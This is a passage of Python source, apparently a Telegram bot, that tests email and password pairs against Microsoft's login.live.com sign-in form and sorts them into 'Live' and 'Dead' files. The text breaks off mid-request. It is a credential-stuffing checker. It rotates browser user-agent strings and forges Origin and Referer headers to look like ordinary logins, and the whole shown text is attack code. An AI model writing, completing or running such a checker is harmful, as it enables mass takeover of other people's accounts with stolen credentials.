import os
import requests
import random
from datetime import datetime
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# ====================== RAILWAY VARIABLES ======================
TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID"))

if not TOKEN or not ADMIN_ID:
    print("❌ BOT_TOKEN أو ADMIN_ID غير موجودين!")
    exit()

# ====================== SETTINGS ======================
LIVE_FILE = "Live.txt"
DEAD_FILE = "Dead.txt"

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
]

# ====================== CHECK FUNCTION ======================
def check_account(email: str, password: str):
    try:
        session = requests.Session()

        headers = {
            "User-Agent": random.choice(user_agents),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://login.live.com",
            "Referer": "https://login.live.com/",
        }

        data = {
            "i13": "1",
            "login": email,
            "loginfmt": email,
            "type": "11",
            "LoginOptions": "1",
            "passwd": password,
            "ps": "2",
            "NewUser": "1",
            "fspost": "
